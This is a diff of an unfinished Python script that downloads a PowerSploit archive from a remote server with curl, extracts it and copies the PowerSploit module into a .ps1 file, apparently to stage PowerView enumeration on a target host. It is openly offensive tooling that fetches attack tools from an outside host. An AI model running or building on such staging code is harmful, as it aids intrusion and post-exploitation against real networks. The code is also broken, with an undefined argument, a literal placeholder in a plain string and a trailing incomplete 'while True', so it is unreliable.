@@ -1,5 +1,6 @@
 import subprocess
 import ipaddress
+import os
 
 #I want to get powerview from server first
 
@@ -26,19 +27,41 @@ class curl_data():
 		if self.url == "": #Use default URL
 			self.command = f'{self.command} -o PowerSploit.zip http://{server.address}:{server.port}/PowerSploit-master_3.zip'
 			self.output = subprocess.run(self.command,shell=True)
-			#print(self.output)
-
+			
 	def extract_data(self):
-		self.extract_cmd = f''
+		self.extract_cmd = f'tar -xvf ./PowerSploit.zip '
+		self.output = subprocess.run(self.extract_cmd,shell=True)
+		# tar -xvf ./PowerSploit.zip
+
 
 
 class enumerate():
 	def __init__(self):
-		self.file_name = "{self}_PowerSploit.txt"
+		self.enum_name = "{self}_PowerSploit.txt"
+		self.powersploit = "PowerSploit-master"
+	
+	def change_dir(self):
+		os.chdir(self.powersploit)
+		self.command = f'PowerSploit.psm1'
+		#self.print_dir = subprocess.run(self.command,shell=True)
+	
+	def psm_ps(self):
+		self.ps1 = open('PowerSploit.ps1','a')
+		self.psm1 = open('PowerSploit.psm1','r')
+		self.psm1.data = self.psm1.read()
+		self.ps1.write(self.psm1.data)
+		self.psm1.close()
+		self.ps1.close()
 
 
 
 
 server = ip_address()
 link = curl_data()
-link.down_data(server)
+#link.down_data(server)
+#link.extract_data()
+enum = enumerate(abx)
+enum.change_dir()
+enum.psm_ps()
+
+while True
